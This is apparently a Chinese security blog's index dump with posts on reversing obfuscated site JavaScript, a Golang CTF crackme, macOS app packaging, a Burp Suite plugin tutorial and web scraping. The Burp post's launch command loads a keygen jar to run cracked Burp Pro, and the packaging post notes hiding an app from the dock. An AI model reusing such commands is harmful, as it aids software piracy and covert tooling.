_0x73188a = getRandomNum(_0xe89c07);</span><br><span class="line">    $[&#x27;ajax&#x27;](&#123;</span><br><span class="line">        &#x27;type&#x27;: _0x25521d[_0x34da(&#x27;‫9b&#x27;, &#x27;wjKk&#x27;)],</span><br><span class="line">        &#x27;url&#x27;: _0x25521d[_0x34da(&#x27;‫9c&#x27;, &#x27;K)OH&#x27;)],</span><br><span class="line">        &#x27;beforeSend&#x27;: function() &#123;</span><br><span class="line">            _0x25521d[_0x34da(&#x27;‫9d&#x27;, &#x27;Ioe9&#x27;)]($, &#x27;#result_table&#x27;)[_0x34da(&#x27;‮9e&#x27;, &#x27;wjKk&#x27;)](_0x25521d[_0x34da(&#x27;‫9f&#x27;, &#x27;kjeK&#x27;)]);</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;data&#x27;: &#123;</span><br><span class="line">            &#x27;pageNo&#x27;: currPage,</span><br><span class="line">            &#x27;pageSize&#x27;: pageSize,</span><br><span class="line">            &#x27;Kw&#x27;: pageKw,</span><br><span class="line">            &#x27;enKey&#x27;: enkey,</span><br><span class="line">            &#x27;randomNum&#x27;: _0x73188a,</span><br><span class="line">            &#x27;token&#x27;: _0x410bc0</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang逆向</title>
      <link href="/2022/08/12/Golang%E9%80%86%E5%90%91/"/>
      <url>/2022/08/12/Golang%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA-golang解析相关项目"><a href="#IDA-golang解析相关项目" class="headerlink" title="IDA golang解析相关项目"></a>IDA golang解析相关项目</h2><p><a href="https://github.com/0xjiayu/go_parser">https://github.com/0xjiayu/go_parser</a></p><p><a href="https://github.com/sibears/IDAGolangHelper">https://github.com/sibears/IDAGolangHelper</a></p><p><a href="https://github.com/SentineLabs/AlphaGolang">https://github.com/SentineLabs/AlphaGolang</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在测试的时候，在ida7.5环境中只成功运行了IDAGolangHelper</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled.png" alt="Untitled"></p><p>选择下载的解析脚本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%201.png" alt="Untitled"></p><p>按需选择相应的功能</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%202.png" alt="Untitled"></p><p>点击<code>try to datemine go version based on moduledata</code></p><p>判断module的版本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%203.png" alt="Untitled"></p><p>点击 <code>try to datemine go version based on version string</code></p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%204.png" alt="Untitled"></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="扫描器样本"><a href="#扫描器样本" class="headerlink" title="扫描器样本"></a>扫描器样本</h3><p>蓝队捕获的一个扫描器样本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%205.png" alt="Untitled"></p><h3 id="inctf-ultimateGo"><a href="#inctf-ultimateGo" class="headerlink" title="inctf ultimateGo"></a>inctf ultimateGo</h3><h2 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h2><p>尝试运行程序：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%206.png" alt="Untitled"></p><p>输入正确的字符就会输出flag，基本思路就是在程序中找到判断位置，然后静态分析或动态分析出这个这个正确的字符串。</p><p>在测试的时候，在ida7.5环境中只成功运行了IDAGolangHelper</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled.png" alt="Untitled"></p><p>选择下载的解析脚本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%201.png" alt="Untitled"></p><p>按需选择相应的功能</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%202.png" alt="Untitled"></p><p>点击<code>try to datemine go version based on moduledata</code></p><p>判断module的版本</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%207.png" alt="Untitled"></p><p>点击 <code>try to datemine go version based on version string</code></p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%208.png" alt="Untitled"></p><p>点击 <code>Rename functions</code> 尝试还原函数名</p><p>在还原函数名时总是报错：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%209.png" alt="Untitled"></p><p>通过查看issues发现解决方法：</p><p><a href="https://github.com/sibears/IDAGolangHelper/issues/20">https://github.com/sibears/IDAGolangHelper/issues/20</a></p><p>其中报错信息提示name的数据类型不对，把name decode下解决报错问题。</p><p>重复上述过程，点击<code>OK</code>后就可以使用F5大法查看逆向出来的代码了</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2010.png" alt="Untitled"></p><p>我们通常从main函数下手</p><p>输出提示信息：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2011.png" alt="Untitled"></p><p>输入字符串：</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2012.png" alt="Untitled"></p><p>下面是一个if判断，</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2013.png" alt="Untitled"></p><p>首先去判断字符串长度是否为21，然后还有判断<code>&#123;&#125;</code> 这两个字符，我们可以知道输入的其实就是flag</p><p><img src="/../imgs/Golang%E9%80%86%E5%90%91%20898e7649a53743078b3734fc1c59a9a7/Untitled%2014.png" alt="Untitled"></p><p>进入循环，通过把输入的字符串逐字符进行加密操作后和程序中存储的字符进行对比。</p><p>ps：其中分析的时候有主观猜测，比如<code>v24[1] == 24</code> 为什么下标为1的表示这个字符串的大小呢</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac app打包</title>
      <link href="/2022/06/13/mac%20app%E6%89%93%E5%8C%85/"/>
      <url>/2022/06/13/mac%20app%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="为APP制作图标"><a href="#为APP制作图标" class="headerlink" title="为APP制作图标"></a>为APP制作图标</h2><p>创建<code>icons.iconset</code>文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir icons.iconset</span><br></pre></td></tr></table></figure><p>生成图片集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sips -z <span class="number">16</span> <span class="number">16</span> ali.png --out icons.iconset/icon_16x16.png</span><br><span class="line">sips -z <span class="number">32</span> <span class="number">32</span> ali.png --out icons.iconset/icon_16x16@2x.png</span><br><span class="line">sips -z <span class="number">32</span> <span class="number">32</span> ali.png --out icons.iconset/icon_32x32.png</span><br><span class="line">sips -z <span class="number">64</span> <span class="number">64</span> ali.png --out icons.iconset/icon_32x32@2x.png</span><br><span class="line">sips -z <span class="number">128</span> <span class="number">128</span> ali.png --out icons.iconset/icon_128x128.png</span><br><span class="line">sips -z <span class="number">256</span> <span class="number">256</span> ali.png --out icons.iconset/icon_128x128@2x.png</span><br><span class="line">sips -z <span class="number">256</span> <span class="number">256</span> ali.png --out icons.iconset/icon_256x256.png</span><br><span class="line">sips -z <span class="number">512</span> <span class="number">512</span> ali.png --out icons.iconset/icon_256x256@2x.png</span><br><span class="line">sips -z <span class="number">512</span> <span class="number">512</span> ali.png --out icons.iconset/icon_512x512.png</span><br><span class="line">sips -z <span class="number">1024</span> <span class="number">1024</span> ali.png --out icons.iconset/icon_512x512@2x.png</span><br></pre></td></tr></table></figure><p>转化成<code>icon.icns</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconutil -c icns -o icon.icns icons.iconset</span><br></pre></td></tr></table></figure><h2 id="制作-app-bundle"><a href="#制作-app-bundle" class="headerlink" title="制作 .app bundle"></a>制作 .app bundle</h2><p>mac上运行的程序其实上一个.app的文件夹，其中包含了二进制文件和清单文件。</p><p>目录结构如下；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree my.app</span><br><span class="line">my.app/</span><br><span class="line">└── Contents</span><br><span class="line">    ├── Info.plist</span><br><span class="line">    ├── MacOS</span><br><span class="line">    │   └── my</span><br><span class="line">    └── Resources</span><br><span class="line">        └── icon.icns</span><br><span class="line">3 directories, 3 files</span><br></pre></td></tr></table></figure><p>其中有三个关键的文件：</p><ul><li>Info.plist:清单文件</li><li>my: 你要打包的二进制文件</li><li>icon.icns: 打包好的不同尺寸的图标文件</li></ul><h3 id="添加Info-plist"><a href="#添加Info-plist" class="headerlink" title="添加Info.plist"></a>添加Info.plist</h3><p>文件示例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleExecutable<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>my<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIconFile<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>icon.icns<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIdentifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.yours<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>NSHighResolutionCapable<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>LSUIElement<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中你需要更改的地方为<code>CFBundleExecutabl</code>、<code>CFBundleIdentifier</code></p><p>ps：<code>LSUIElement</code> 告诉macos这个程序是一个代理程序，以至于它不会出现在任务栏中。起到了一定的隐藏效果。。</p><p>现在你就得到了一个可以双击打开的app了</p><h2 id="制作DMG文件"><a href="#制作DMG文件" class="headerlink" title="制作DMG文件"></a>制作DMG文件</h2><p>制作一个磁盘文件，其中放置了你的app，这样可以轻易的拖拽到应用文件夹并且安装。</p><h3 id="制作-DMB-模板"><a href="#制作-DMB-模板" class="headerlink" title="制作 DMB 模板"></a><strong>制作 DMB 模板</strong></h3><p>打开磁盘工具。按 ⌘N 创建一个新的磁盘镜像。给它取个名字，配置好足以容纳你的程序包的空间大小。</p><p><img src="/../imgs/mac%20app%E6%89%93%E5%8C%85%204d57e10a603b4660b158fd15ef526815/Untitled.png" alt="Untitled"></p><p>在访达中找到挂载的镜像。定制此文件夹的试图设置，使它成为用户实际安装史看到的样子。通常我们可以设置一个背景图片、隐藏工具栏和边栏、增加图标尺寸。</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 1.png)</p><p>配置如下：</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 2.png)</p><h3 id="转换-DMG-文件以便于分发"><a href="#转换-DMG-文件以便于分发" class="headerlink" title="转换 DMG 文件以便于分发"></a><strong>转换 DMG 文件以便于分发</strong></h3><p>把磁盘文件进行压缩，进行转换</p><p>打开磁盘工具，选择镜像-&gt;转换。给文件起一个有意义的名称，其他设置保持不变。（镜像格式应为“压缩”）</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 3.png)</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 4.png)</p><p>这样我们的磁盘安装包就弄好啦</p><p>![Untitled](..&#x2F;imgs&#x2F;mac%20app打包%204d57e10a603b4660b158fd15ef526815&#x2F;Untitled 5.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brup插件编写</title>
      <link href="/2022/04/30/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2022/04/30/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="编写插件基础步骤"><a href="#编写插件基础步骤" class="headerlink" title="编写插件基础步骤"></a>编写插件基础步骤</h1><ol><li><p>首先你得有一个IDE：<a href="https://www.jetbrains.com/idea/">IntelliJ IDEA</a>,<a href="https://netbeans.org/">Netbeans</a>,<br>and<a href="https://www.eclipse.org/">Eclipse</a></p></li><li><p>新建一个项目，并且新建一个命名为burp的package</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled.png" alt="Untitled"></p><p>![Untitled](..&#x2F;imgs&#x2F;Brup插件编写%203ad132a22e8f46f7b215806633aa7956&#x2F;Untitled 1.png)</p></li><li><p>从burp中下载接口文件</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%202.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%203.png" alt="Untitled"></p></li><li><p>在burp包中，把接口文件复制到burp包中，并新建<code>BurpExtender.java</code></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%204.png" alt="Untitled"></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BurpExtender</span> <span class="keyword">implements</span> <span class="title class_">IBurpExtender</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// implement IBurpExtender</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// set our extension name</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// obtain our output and error streams</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stdout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStdout(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">stderr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(callbacks.getStderr(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        stdout.println(<span class="string">&quot;Hello output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        stderr.println(<span class="string">&quot;Hello errors&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        callbacks.issueAlert(<span class="string">&quot;Hello alerts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exceptions&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译生成jar包</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%205.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%206.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%207.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%208.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%209.png" alt="Untitled"></p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2010.png" alt="Untitled"></p><p>编译成功</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2011.png" alt="Untitled"></p></li><li><p>加载插件</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2012.png" alt="Untitled"></p><p>加载成功</p><p><img src="/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2013.png" alt="Untitled"><br><img src="/../imgs/../imgs/Brup%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%203ad132a22e8f46f7b215806633aa7956/Untitled%2013.png" alt="Untitled 13.png"></p></li><li><p>远程调试<br>idea设置remote jvm debug</p><p>![Untitled](..&#x2F;imgs&#x2F;Brup插件编写%203ad132a22e8f46f7b215806633aa7956&#x2F;Untitled 14.png)</p><p>burp启动命令，java版本需要在java9以上</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/<span class="title class_">Cellar</span>/openjdk@<span class="number">11</span>/<span class="number">11.0</span><span class="number">.15</span>/libexec/openjdk.<span class="property">jdk</span>/<span class="title class_">Contents</span>/<span class="title class_">Home</span>/bin/java -<span class="attr">agentlib</span>:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="number">5005</span> -<span class="attr">javaagent</span>:<span class="title class_">BurpLoaderKeygen</span>.<span class="property">jar</span> -noverify -jar burpsuite_pro.<span class="property">jar</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫相关</title>
      <link href="/2022/03/29/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3/"/>
      <url>/2022/03/29/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="编写第一个selenium脚本"><a href="#编写第一个selenium脚本" class="headerlink" title="编写第一个selenium脚本"></a>编写第一个selenium脚本</h2><ol><li>建立一个浏览器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br></pre></td></tr></table></figure><h2 id="Chrome-XPath-使用"><a href="#Chrome-XPath-使用" class="headerlink" title="Chrome XPath 使用"></a>Chrome XPath 使用</h2><ol><li>qcc域名</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x(<span class="string">&#x27;//div[@class=&quot;contact-info&quot;]/div[2]/span/span/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n                      https://www.qingteng.cn/\n</span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E7%88%AC%E8%99%AB%E7%9B%B8%E5%85%B3%2071c1ac3a2d084ab78b42f4117352a822/Untitled.png" alt="Untitled"></p><p>字段中存在<code>\n “ ”</code>多余的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">26</span>]: s</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">&#x27;\n                      www.people.cn\n                    &#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: s.strip()</span><br><span class="line">Out[<span class="number">27</span>]: <span class="string">&#x27;www.people.cn&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Pyppeteer使用"><a href="#Pyppeteer使用" class="headerlink" title="Pyppeteer使用"></a><a href="https://miyakogi.github.io/pyppeteer/index.html#">Pyppeteer</a>使用</h2><p>puppeteer JavaScript headless chrome&#x2F;chromium 浏览器自动化python实现的非官方接口</p><p>文档地址：</p><p><a href="https://miyakogi.github.io/pyppeteer/">Pyppeteer</a></p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>pyppeteer需要Python3.6+</p><p>通过pip安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install pyppeteer</span><br></pre></td></tr></table></figure><h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2. 基本使用"></a>2. 基本使用</h2><p>note: 第一次运行pyppeteer会下载当前最新版本的Chromium</p><p>Ex1: 打开一个网站并截图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment"># 声明一个浏览器</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch()</span><br><span class="line"><span class="comment"># 打开一个新的标签页</span></span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;example.png&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><p>Ex2: 在页面中执行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    browser = <span class="keyword">await</span> launch()</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;example.png&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    dimensions = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;&#x27;&#x27;() =&gt; &#123;</span></span><br><span class="line"><span class="string">        return &#123;</span></span><br><span class="line"><span class="string">            width: document.documentElement.clientWidth,</span></span><br><span class="line"><span class="string">            height: document.documentElement.clientHeight,</span></span><br><span class="line"><span class="string">            deviceScaleFactor: window.devicePixelRatio,</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dimensions)</span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; &#123;&#x27;width&#x27;: 800, &#x27;height&#x27;: 600, &#x27;deviceScaleFactor&#x27;: 1&#125;</span></span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><h2 id="3-puppeteer和pyppeteer差异点"><a href="#3-puppeteer和pyppeteer差异点" class="headerlink" title="3. puppeteer和pyppeteer差异点"></a>3. <strong>puppeteer和pyppeteer差异点</strong></h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>Puppeteer 使用对象（python 中的字典）将选项传递给函数&#x2F;方法。 Pyppeteer 接受选项的字典和关键字参数。</p><p>字典形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;headless&#x27;</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure><p>参数形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = <span 